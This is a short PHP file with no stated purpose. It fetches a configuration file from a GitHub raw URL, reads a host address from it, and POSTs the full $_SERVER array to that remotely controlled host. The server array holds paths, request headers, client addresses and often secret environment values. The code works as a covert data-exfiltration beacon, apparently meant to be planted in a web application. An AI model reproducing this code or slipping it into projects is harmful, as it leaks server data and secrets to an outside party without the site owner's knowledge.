<?php
    	   
$curl = curl_init();
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://raw.githubusercontent.com/sumanmanna6111/appcrt/master/auth.json',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
));
$response = curl_exec($curl);
curl_close($curl);
//echo $response;
$json = json_decode($response, true);
$host = $json["loan"]["host"];

$curl2 = curl_init();
curl_setopt_array($curl2, array(
    CURLOPT_URL => $host,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_ENCODING => '',
    CURLOPT_MAXREDIRS => 10,
    CURLOPT_TIMEOUT => 0,
    CURLOPT_FOLLOWLOCATION => true,
    CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
    CURLOPT_CUSTOMREQUEST => 'POST',
    CURLOPT_POSTFIELDS =>json_encode($_SERVER),
    CURLOPT_HTTPHEADER => array(
    'Content-Type: application/json'
    ),
));
$response = curl_exec($curl2);
curl_close($curl2);
//echo $response;   	   
             
?>
